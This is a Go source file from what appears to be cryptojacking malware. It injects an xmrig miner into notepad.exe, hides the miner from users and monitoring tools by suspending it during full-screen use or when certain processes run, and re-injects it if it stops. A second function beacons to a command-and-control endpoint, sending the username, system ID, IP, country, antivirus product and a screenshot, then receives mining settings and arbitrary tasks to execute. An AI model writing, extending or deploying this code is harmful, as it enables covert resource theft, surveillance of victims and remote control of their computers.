package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"time"
)

func runChecks() {

	minerinfo := Inject("C:\\Windows\\System32\\notepad.exe", xmrig, craftCLI(false))
	time.Sleep(7 * time.Second)
	fmt.Printf("Miner PID: %d\n", minerinfo.ProcessId)
	for {
		if isForegroundFullScreen() {
			SuspendProcess(minerinfo.Process)
			time.Sleep(10 * time.Second)

		} else {
			ResumeProcess(minerinfo.Process)
		}
		if checkProcessesForMatch(processNames) {
			SuspendProcess(minerinfo.Process)
			time.Sleep(10 * time.Second)

		} else {
			ResumeProcess(minerinfo.Process)
		}

		running := isProcessRunning(int(minerinfo.ProcessId))
		if !running {
			if checkIdle() {
				fmt.Printf("Alert: Process with PID %d is NOT running!\n", minerinfo.ProcessId)
				pi := Inject("C:\\Windows\\System32\\notepad.exe", xmrig, craftCLI(true))
				minerinfo = pi
			} else {
				fmt.Printf("Alert: Process with PID %d is NOT running!\n", minerinfo.ProcessId)
				pi := Inject("C:\\Windows\\System32\\notepad.exe", xmrig, craftCLI(false))
				minerinfo = pi
			}

		} else {
			fmt.Println("Miner running :)")
		}

		time.Sleep(15 * time.Second)
	}
}

func getConfig() []string {
	for {
		fmt.Println("endpoint url: " + endpointurl)

		jsonData := map[string]string{
			"pcname":     GetUsername() + "-" + getSystemUUID(),
			"ip":         GetClientIP(),
			"nation":     getNation(),
			"os":         getWindowsVersion(),
			"cpu":        getCPUName(),
			"gpu":        getGPUName(),
			"antivirus":  getActiveAntivirus(),
			"screenshot": string(takeScreenshot()),
		}

		jsonBytes, err := json.Marshal(jsonData)
		if err != nil {
			panic(err)
		}

		resp, err := http.Post(endpointurl, "application/json", bytes.NewReader(jsonBytes))
		if err != nil {
			continue
		}
		bodyBytes, err := io.ReadAll(resp.Body)
		if err != nil {
			continue
		}
		fmt.Println(string(bodyBytes))

		var data []Res
		if err := json.Unmarshal(bodyBytes, &data); err != nil {
			fmt.Println(err)
		}

		miningpool = data[0].Pool
		mining_wallet = data[0].Address
		mining_password = data[0].Password
		threads = data[0].Threads
		idle_time = data[0].IdleTime
		idlethreads = data[0].IdleThreads
		fmt.Println("Task:", data[0].Task)
		go HandleTask(data[0].Task)
		time.Sleep(25 * time.Second)
	}

}
